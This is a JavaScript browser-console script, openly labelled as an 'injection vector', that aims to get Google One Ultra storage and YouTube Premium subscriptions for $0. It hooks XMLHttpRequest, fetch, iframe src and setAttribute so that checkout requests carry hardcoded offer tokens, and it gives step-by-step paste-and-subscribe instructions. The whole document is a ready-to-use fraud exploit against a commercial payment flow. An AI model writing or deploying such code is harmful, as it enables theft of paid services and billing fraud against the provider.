/* ═══════════════════════════════════════════════════════════════════
   G1 Ultra $0 — INJECTION VECTOR #2: Console Injection (No Extension)
   ═══════════════════════════════════════════════════════════════════
   
   USAGE:
   1. Open https://one.google.com/about/plans in Chrome
   2. Press F12 → Console tab
   3. Paste this ENTIRE script and press Enter
   4. Click "Subscribe" on any Ultra plan
   5. Checkout shows $0.00
   
   This is the SAME mechanism as the extension's inject.js but runs
   without installing any extension. Works in any Chromium browser.
   ═══════════════════════════════════════════════════════════════════ */

(() => {
  if (window.__G1_CONSOLE_INJECTED) { console.log("[G1] Already injected"); return; }
  window.__G1_CONSOLE_INJECTED = true;

  // ── Token Database ──
  const TOKENS = {
    ultra20tb_12m: "AYrTWi65Jbm3KRubLXLLA3Re29zKibSnRbvAJEPfxEIVs/d57w8vEhsU7hSkSAfGyjZH8B7/5aj5UTlidbsEwUH8aPN2RTA6pKiltA==",
    ultra20tb_6m: "AYrTWi6lMoHTB2cVb1VC+i3DHvfp1Q9VGblBeF9b1+O8e5+kNws87YdcgNEUJOuHJDp/mitKx1KmBCYurbXIubpM50o4AqgcBB3gMGk85mQ=",
    ultra20tb_3m: "AYrTWi6sldhCH+REVXA3inXWB+LuAvtnSPYHMvhbqKmv3TRdQPhoynS4ZTLxPEiaNGnaAmDTqliYzrLwJ3Aq49Vi9ktjNP+xcTF5R9Yn1MQ=",
    ultra20tb_1m: "AYrTWi5QWD5gc0ZxMJHAAUvXbYRFJgI6w5vnF9PKIFg1DFQML36iijrmN5Vum7u9ty2JnHvt9JFLgsfGKwScJcfZaKttqn0hSX4Fnpdn9No=",
    ultra30tb_12m: "AYrTWi51Eo3HG0tq1J6SYr4u3FDCCxb6xSEEWHskaFwSA7Vn4y+Lfqlfy+Lbkx2T/xPi4uCRB71ZIn+weD0kHZsMgS6ogUiZ8hG9SA==",
    YT_FREE: "AVbCH/eW4Nfp8KBl0zlm7x9PhaiCvpnqwUuL2D8NFPBQgmM9+HuYS1h2xH5lLWU/BsBj775LK5GqK8UHKqoSzhDDz+PqP3paNesqLU0r9i6XCrYa"
  };

  const SKU = "subs:com.google.android.apps.subscriptions.red:g1.play.20tb";
  const YT_SKU = "subs:com.google.android.apps.subscriptions.red:g1.youtube_premium_individual_add_on";
  const ACTIVE_TOKEN = TOKENS.ultra20tb_12m;

  function makeItem(sku, token) {
    return [[sku, 21], null, null, null, 1, [token]];
  }

  const full_items = [
    makeItem(SKU, ACTIVE_TOKEN),
    makeItem(YT_SKU, TOKENS.YT_FREE)
  ];

  // ── HOOK 1: XMLHttpRequest.send() — intercept Ngbm RPC ──
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    if (typeof body === "string" && body.includes("Ngbm")) {
      try {
        const params = new URLSearchParams(body);
        let freq = params.get("f.req");
        if (freq) {
          const parsed = JSON.parse(freq);
          // Find Ngbm call and patch item[12] with offer token
          for (const outer of parsed) {
            if (!Array.isArray(outer)) continue;
            for (const item of outer) {
              if (!Array.isArray(item) || item[0] !== "Ngbm") continue;
              try {
                const inner = JSON.parse(item[1]);
                if (Array.isArray(inner) && inner.length > 12) {
                  inner[12] = full_items;
                  item[1] = JSON.stringify(inner);
                  console.log("[G1 ✓] Ngbm payload patched with offer token");
                }
              } catch (_) {}
            }
          }
          params.set("f.req", JSON.stringify(parsed));
          body = params.toString();
        }
      } catch (e) {
        console.log("[G1] Parse error:", e.message);
      }
    }
    return origSend.call(this, body);
  };

  // ── HOOK 2: iframe src — rewrite /eacquire/multiline URLs ──
  const origSrcDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, "src");
  if (origSrcDesc && origSrcDesc.set) {
    Object.defineProperty(HTMLIFrameElement.prototype, "src", {
      set: function(val) {
        if (typeof val === "string" && val.includes("/eacquire/multiline")) {
          try {
            const u = new URL(val);
            const ears = u.searchParams.getAll("ear[]");
            if (ears.length > 13) {
              ears[13] = JSON.stringify(full_items);
              u.searchParams.delete("ear[]");
              ears.forEach(e => u.searchParams.append("ear[]", e));
              val = u.toString();
              console.log("[G1 ✓] iframe eacquire URL rewritten with offer token");
            }
          } catch (_) {}
        }
        origSrcDesc.set.call(this, val);
      },
      get: origSrcDesc.get,
      configurable: true
    });
  }

  // ── HOOK 3: Element.setAttribute("src") backup ──
  const origSetAttr = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function(name, value) {
    if (name === "src" && typeof value === "string" && value.includes("/eacquire/multiline")) {
      try {
        const u = new URL(value);
        const ears = u.searchParams.getAll("ear[]");
        if (ears.length > 13) {
          ears[13] = JSON.stringify(full_items);
          u.searchParams.delete("ear[]");
          ears.forEach(e => u.searchParams.append("ear[]", e));
          value = u.toString();
          console.log("[G1 ✓] setAttribute src rewritten");
        }
      } catch (_) {}
    }
    return origSetAttr.call(this, name, value);
  };

  // ── HOOK 4: window.fetch() — Google may use fetch API too ──
  const origFetch = window.fetch;
  window.fetch = function(input, init) {
    if (init && init.body && typeof init.body === "string" && init.body.includes("Ngbm")) {
      try {
        const params = new URLSearchParams(init.body);
        let freq = params.get("f.req");
        if (freq) {
          const parsed = JSON.parse(freq);
          for (const outer of parsed) {
            if (!Array.isArray(outer)) continue;
            for (const item of outer) {
              if (!Array.isArray(item) || item[0] !== "Ngbm") continue;
              try {
                const inner = JSON.parse(item[1]);
                if (Array.isArray(inner) && inner.length > 12) {
                  inner[12] = full_items;
                  item[1] = JSON.stringify(inner);
                  console.log("[G1 ✓] fetch Ngbm patched");
                }
              } catch (_) {}
            }
          }
          params.set("f.req", JSON.stringify(parsed));
          init.body = params.toString();
        }
      } catch (_) {}
    }
    return origFetch.call(this, input, init);
  };

  console.log("═══════════════════════════════════════════");
  console.log("[G1 Ultra $0] Console injection ACTIVE");
  console.log("Plan: 20TB Ultra (12 months) + YouTube Premium");
  console.log("Hooks: XHR ✓ | iframe.src ✓ | setAttribute ✓ | fetch ✓");
  console.log("Now click 'Subscribe' on any Ultra plan →  $0.00");
  console.log("═══════════════════════════════════════════");
})();
